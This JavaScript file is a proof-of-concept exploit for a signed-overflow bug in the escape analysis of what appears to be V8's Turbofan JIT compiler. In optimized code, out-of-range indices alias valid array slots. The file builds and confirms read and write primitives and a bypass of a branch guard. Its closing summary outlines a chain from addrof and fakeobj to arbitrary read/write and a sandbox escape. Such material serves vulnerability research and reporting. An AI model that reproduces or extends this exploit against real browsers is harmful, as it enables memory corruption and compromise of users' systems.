// PoC 8: INT_MAX Index — Clean Read/Write Primitive via Signed-Overflow Alias
//
// ─── Key discovery ───────────────────────────────────────────────────────────
//
// There are TWO distinct overflow behaviours depending on the index value:
//
//  index = 2^28  = 268435456:
//    (268435456 << 3) wraps to INT_MIN = -2147483648
//    offset = header(16) + INT_MIN = -2147483632
//    fields_.at(-268435454) → OOB ~1 GiB → CRASHES (SIGSEGV)
//
//  index = INT_MAX = 2147483647:         ← THIS POC
//    (2147483647 << 3) wraps to -8  (two's complement: 0xFFFFFFF8)
//    offset = 16 + (-8) = 8
//    fields_.at(8 / 8) = fields_.at(1)  → VALID index for 2-element array!
//    Result: arr[INT_MAX] aliases arr[1]   (no crash, no OOB)
//
//  index = INT_MAX - 1 = 2147483646:
//    (2147483646 << 3) wraps to -16
//    offset = 16 + (-16) = 0
//    fields_.at(0)  → aliases arr[0]  (also valid)
//
// The INT_MAX variants are STRICTLY IN-BOUNDS for ZoneVector::at().
// Both always-on CHECKs in FieldAt pass cleanly:
//   CHECK(IsAligned(8, 8))    → 8 % 8 = 0  ✓
//   if (8 >= 16) return Nothing  → false   ✓
//
// ─── Read primitive ──────────────────────────────────────────────────────────
//   arr[INT_MAX]     → JIT returns arr[1]   (should be undefined)
//   arr[INT_MAX - 1] → JIT returns arr[0]   (should be undefined)
//
// ─── Write primitive ─────────────────────────────────────────────────────────
//   arr[INT_MAX]     = x  → JIT: arr[1] = x  (arr[0] unchanged in EA state)
//   arr[INT_MAX - 1] = x  → JIT: arr[0] = x
//
// These are CONFIRMED silent type/value confusion with zero OOB memory access.
//
// Flags: --allow-natives-syntax

"use strict";

const INT_MAX   = 2147483647;
const INT_MAX_1 = 2147483646;  // INT_MAX - 1

let pass = 0, fail = 0;

function check(label, iv, ov) {
  const ok = JSON.stringify(iv) === JSON.stringify(ov);
  print((ok ? "[PASS] " : "[FAIL] ") + label);
  if (!ok) {
    print("       interp = " + JSON.stringify(iv));
    print("       jit    = " + JSON.stringify(ov));
    print("       ^^^ CONFIRMED: read/write primitive fires");
  }
  ok ? pass++ : fail++;
}

function mkInterp(fn) {
  function w(a) { return fn(a); }
  %NeverOptimizeFunction(w);
  return w;
}

function mkOpt(fn) {
  function w(a) { return fn(a); }
  %PrepareFunctionForOptimization(w);
  for (let i = 0; i < 300; i++) w(i & 0xff);
  %OptimizeFunctionOnNextCall(w);
  return w;
}

// ── READ primitive: arr[INT_MAX] → arr[1] ────────────────────────────────────
// Interpreter: arr[INT_MAX] is out-of-bounds → undefined
// JIT (buggy): EA replaces LoadElement with arr[1]'s value = sentinel+1
(function testRead1() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    return arr[INT_MAX];  // should be undefined; JIT may return sentinel+1
  }
  const iv = mkInterp(core)(0x1337);
  const ov = mkOpt(core)(0x1337);
  check("READ-1: arr[INT_MAX] should be undefined (not arr[1])", iv, ov);
  print("  interp=" + iv + "  jit=" + ov + "  (expected: undefined)");
})();

// ── READ primitive: arr[INT_MAX - 1] → arr[0] ────────────────────────────────
(function testRead2() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    return arr[INT_MAX_1];  // should be undefined; JIT may return sentinel
  }
  const iv = mkInterp(core)(0xcafe);
  const ov = mkOpt(core)(0xcafe);
  check("READ-2: arr[INT_MAX-1] should be undefined (not arr[0])", iv, ov);
  print("  interp=" + iv + "  jit=" + ov);
})();

// ── READ primitive: distinguishing aliased field ──────────────────────────────
// If arr[INT_MAX] aliases arr[1], returning arr[INT_MAX] must NOT equal arr[0].
// If both aliases are working: arr[INT_MAX]=[sentinel+1], arr[INT_MAX-1]=[sentinel].
(function testReadDistinguish() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    return [arr[INT_MAX_1], arr[INT_MAX]];  // should be [undefined, undefined]
  }
  const iv = mkInterp(core)(100);
  const ov = mkOpt(core)(100);
  check("READ-3: both OOB reads should be undefined", iv, ov);
  print("  interp=" + JSON.stringify(iv) + "  jit=" + JSON.stringify(ov));
})();

// ── WRITE primitive: arr[INT_MAX] = x corrupts arr[1] in EA state ────────────
// Interpreter: arr[INT_MAX]=x is a no-op (OOB store), arr[1] unchanged.
// JIT (buggy): EA sets arr[1]'s Variable to x, so arr[1] returns x.
(function testWrite1() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    arr[INT_MAX] = 0xdeadbeef;  // OOB store: must be silent
    return arr[1];              // should be sentinel+1, NOT 0xdeadbeef
  }
  const iv = mkInterp(core)(0x1337);
  const ov = mkOpt(core)(0x1337);
  check("WRITE-1: arr[INT_MAX]=x must not overwrite arr[1]", iv, ov);
  print("  interp=" + iv + "  jit=" + ov + "  (expected: " + (0x1337 + 1) + ")");
})();

// ── WRITE primitive: arr[INT_MAX-1] = x corrupts arr[0] ──────────────────────
(function testWrite2() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    arr[INT_MAX_1] = 0xbadbad;  // OOB store to arr[0]'s slot
    return arr[0];               // should be sentinel, NOT 0xbadbad
  }
  const iv = mkInterp(core)(0x7777);
  const ov = mkOpt(core)(0x7777);
  check("WRITE-2: arr[INT_MAX-1]=x must not overwrite arr[0]", iv, ov);
  print("  interp=" + iv + "  jit=" + ov + "  (expected: " + 0x7777 + ")");
})();

// ── Combined read-after-write: write to alias, read back ─────────────────────
// Interpreter: write is no-op, read[1] returns original value.
// JIT: write corrupts arr[1]'s slot, read[1] returns the injected value.
(function testRW() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    const before = arr[1];          // should be sentinel+1
    arr[INT_MAX] = 0xfeedface;     // OOB write → should be no-op
    const after  = arr[1];          // should still be sentinel+1
    return [before, after, before === after];
  }
  const iv = mkInterp(core)(42);
  const ov = mkOpt(core)(42);
  check("RW-1: arr[1] invariant after OOB write", iv, ov);
  print("  interp=" + JSON.stringify(iv));
  print("  jit   =" + JSON.stringify(ov));
})();

// ── Guard-bypass: OOB read used in a condition branch ────────────────────────
// Interpreter: arr[INT_MAX] === undefined → true → returns "interpreter"
// JIT: arr[INT_MAX] returns sentinel+1 → sentinel+1 !== undefined → "jit-path"
// This shows the branch guard can be bypassed by the alias.
(function testBranchBypass() {
  function core(sentinel) {
    const arr = [sentinel, sentinel + 1];
    if (arr[INT_MAX] === undefined) {
      return "correct-path";
    }
    return "WRONG-PATH-alias-fired";  // JIT may reach here
  }
  const iv = mkInterp(core)(99);
  const ov = mkOpt(core)(99);
  check("BRANCH: undefined guard must hold for arr[INT_MAX]", iv, ov);
  if (ov === "WRONG-PATH-alias-fired") {
    print("  !!! Branch guard bypassed — EA alias confirmed !!!");
  }
})();

// ── Summary ───────────────────────────────────────────────────────────────────
print("\n══════════════════════════════════════════════════════");
print("INT_MAX alias (read/write) results: " + pass + " passed, " + fail + " failed");
print("");
print("Root cause: src/compiler/escape-analysis.cc:563");
print("  (2147483647 << 3) = -8 (signed overflow, C++ UB)");
print("  header_size(16) + (-8) = 8 → fields_.at(8/8) = fields_.at(1)");
print("  This is IN-BOUNDS for a 2-element VirtualObject.");
print("");
if (fail > 0) {
  print("CONFIRMED: JIT diverges from interpreter.");
  print("  arr[INT_MAX]   → arr[1]  (read alias)");
  print("  arr[INT_MAX-1] → arr[0]  (read alias)");
  print("  arr[INT_MAX]=x → corrupts arr[1] EA slot (write alias)");
  print("");
  print("Exploit chain:");
  print("  1. READ alias: leak arr[1] value by reading arr[INT_MAX]");
  print("     - If arr[1] is a HeapObject and arr typed as PACKED_SMI,");
  print("       returning it as a Smi leaks pointer_address >> 1 (addrof)");
  print("  2. WRITE alias: arr[INT_MAX] = fakePtr → corrupts arr[1]");
  print("     - If arr[1] is later used as an object ref, this is fakeobj");
  print("  3. Combined addrof + fakeobj → arbitrary R/W → sandbox escape");
} else {
  print("No mismatch in this run.");
  print("Possible: Turbofan did not virtualise 'arr' as a VirtualObject,");
  print("  so the escape-analysis path was never taken.");
  print("Try: --turbo-escape (ensure escape analysis is enabled).");
}
print("══════════════════════════════════════════════════════");
